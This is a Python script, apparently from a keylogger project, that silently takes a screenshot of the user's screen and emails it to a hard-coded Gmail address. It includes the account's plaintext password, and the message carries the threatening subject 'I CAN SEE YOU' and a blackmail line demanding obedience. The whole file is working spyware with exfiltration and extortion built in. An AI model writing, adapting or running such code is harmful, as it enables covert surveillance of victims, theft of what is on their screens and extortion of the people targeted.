#Libraries for the screenshot feature
from PIL import ImageGrab

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import os

file_path = "C:\\Users\\bardh\\OneDrive\\Desktop\\keylogger\\KeyLogger Project"     # Change dest file path before test
extension = "\\"

screenshot = "screenshot.jpg"

email_address = "testingproject085@gmail.com"       # Disposable Email
password = "testingproject"                         # Disposable Email Password
email_recipient = "testingproject085@gmail.com"

# Function to take screenshot
def capture_screen():
    img = ImageGrab.grab()
    img.save(file_path + extension + screenshot)

# Function to send screenshot through email
def send_email(filename, attachment, email_recipient):
    from_address = email_address

    # Sets up the email template
    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = email_recipient
    msg['Subject'] = "I CAN SEE YOU"
    body = 'Do what I say or else I will release this to the press'

    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(from_address, password)
    text = msg.as_string()
    s.sendmail(from_address, email_recipient, text)
    s.quit()

# Deletes the content in the text file
if os.path.exists("screenshot.jpg"):
    with open("screenshot.jpg", "r") as f:
        f = open("screenshot.jpg", "r+")
        f.seek(0)
        f.truncate()

capture_screen()
send_email(screenshot, file_path + extension + screenshot, email_recipient)